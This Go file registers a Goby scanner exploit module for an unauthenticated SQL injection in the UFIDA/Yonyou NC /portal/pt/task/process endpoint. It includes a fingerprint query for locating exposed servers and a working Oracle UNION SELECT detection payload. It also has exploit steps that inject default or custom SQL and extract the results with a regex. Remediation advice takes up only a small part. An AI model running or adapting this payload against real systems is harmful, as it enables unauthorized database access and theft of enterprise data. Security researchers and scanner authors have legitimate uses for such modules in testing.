package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "UFIDA NC /portal/pt/task/process SQL Injection Vulnerability",
    "Description": "<p>UFIDA NC is an enterprise-level management software launched by UFIDA Software Company, mainly used to help enterprises achieve integrated management of financial management, supply chain management, production management, project management, human resource management, and other businesses. There is a SQL injection vulnerability in the UFIDA NC /process interface, allowing unauthenticated attackers to execute SQL statements through this interface to obtain sensitive information.</p>",
    "Product": "yonyou-UFIDA-NC",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2024-11-25",
    "PostTime": "2024-11-28",
    "Author": "2826161446@qq.com",
    "FofaQuery": "(body=\"UFIDA\" && body=\"logo/images/\") || (body=\"logo/images/ufida_nc.png\") || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\")",
    "GobyQuery": "(body=\"UFIDA\" && body=\"logo/images/\") || (body=\"logo/images/ufida_nc.png\") || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\")",
    "Level": "1",
    "Impact": "<p>Unauthenticated attackers can exploit the SQL injection vulnerability to execute arbitrary SQL statements through the UFIDA NC /process interface, potentially leading to data leakage and compromising system integrity.</p>",
    "Recommendation": "<p>1. Implement strict input validation and filtering on input parameters to prevent SQL injection attacks.</p><p>2. Update UFIDA NC to the latest version and apply all security patches:<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>3. Use a Web Application Firewall (WAF) to detect and block malicious SQL injection requests.</p>",
    "References": [
        "https://cn-sec.com/archives/3419532.html"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "SELECT name FROM v$database,select banner from sys.v_$version where rownum=1,SELECT USER FROM dual",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT name FROM v$database",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/portal/pt/task/process?pageId=login&id=1&pluginid=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2889%29%7C%7CCHR%2873%29%7C%7CCHR%2882%29%7C%7CCHR%2887%29%7C%7CCHR%2890%29%7C%7CCHR%2868%29%7C%7CCHR%28101%29%7C%7CCHR%28105%29%7C%7CCHR%2874%29%7C%7CCHR%28102%29%7C%7CCHR%2886%29%7C%7CCHR%28113%29%7C%7CCHR%2883%29%7C%7CCHR%2885%29%7C%7CCHR%2870%29%7C%7CCHR%2889%29%7C%7CCHR%2898%29%7C%7CCHR%2885%29%7C%7CCHR%2877%29%7C%7CCHR%2871%29%7C%7CCHR%2866%29%7C%7CCHR%2873%29%7C%7CCHR%28111%29%7C%7CCHR%28112%29%7C%7CCHR%28104%29%7C%7CCHR%2884%29%7C%7CCHR%2869%29%7C%7CCHR%2874%29%7C%7CCHR%2868%29%7C%7CCHR%28110%29%7C%7CCHR%2881%29%7C%7CCHR%2877%29%7C%7CCHR%2870%29%7C%7CCHR%2882%29%7C%7CCHR%2870%29%7C%7CCHR%2889%29%7C%7CCHR%2889%29%7C%7CCHR%2879%29%7C%7CCHR%2898%29%7C%7CCHR%2882%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29,NULL,NULL,NULL,NULL,NULL,NULL%20FROM%20DUAL--%20JvNuu&oracle",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "qvbvqYIRWZDeiJfVqSUFYbUMGBIophTEJDnQMFRFYYObRqkbjq",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/portal/pt/task/process?pageId=login&id=1&pluginid=1%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2C%28{{{payload_encode}}}%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL+FROM+DUAL--+JvNuu&oracle",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|Plugin ([^'][\\s\\S]*?)validate fail",
                "output|when|attackType=sqlpoint|{{{lastreq}}}"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "用友NC /portal/pt/task/process SQL 注入漏洞",
            "Product": "用友-UFIDA-NC",
            "Description": "<p>用友NC(UFIDA NC)是用友软件公司推出的一款企业级管理软件,主要用于帮助企业实现财务管理、供应链管理、生产管理、项目管理、人力资源管理等业务的集成管理。用友NC /process接口处存在SQL注入漏洞，未经身份认证的攻击者可通过该接口执行SQL语句获取敏感信息。</p>",
            "Recommendation": "<p>1. 对输入参数进行严格的输入验证和过滤，防止SQL注入攻击。</p><p>2. 更新用友NC至最新版本，并应用所有安全补丁：<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>3. 使用Web应用防火墙(WAF)来检测和阻止恶意SQL注入请求。</p>",
            "Impact": "<p>未经身份认证的攻击者可利用SQL注入漏洞，通过用友NC /process接口执行任意SQL语句，获取数据库中的敏感信息，可能导致数据泄露和系统完整性受损。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "UFIDA NC /portal/pt/task/process SQL Injection Vulnerability",
            "Product": "yonyou-UFIDA-NC",
            "Description": "<p>UFIDA NC is an enterprise-level management software launched by UFIDA Software Company, mainly used to help enterprises achieve integrated management of financial management, supply chain management, production management, project management, human resource management, and other businesses. There is a SQL injection vulnerability in the UFIDA NC /process interface, allowing unauthenticated attackers to execute SQL statements through this interface to obtain sensitive information.</p>",
            "Recommendation": "<p>1. Implement strict input validation and filtering on input parameters to prevent SQL injection attacks.</p><p>2. Update UFIDA NC to the latest version and apply all security patches:<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>3. Use a Web Application Firewall (WAF) to detect and block malicious SQL injection requests.</p>",
            "Impact": "<p>Unauthenticated attackers can exploit the SQL injection vulnerability to execute arbitrary SQL statements through the UFIDA NC /process interface, potentially leading to data leakage and compromising system integrity.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}",
        "payload_encode": "define|query_encode|{{{payload}}}"
    },
    "EditType": "fast",
    "VariablesOrder": [
        "payload",
        "payload_encode"
    ],
    "PocId": "9974"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
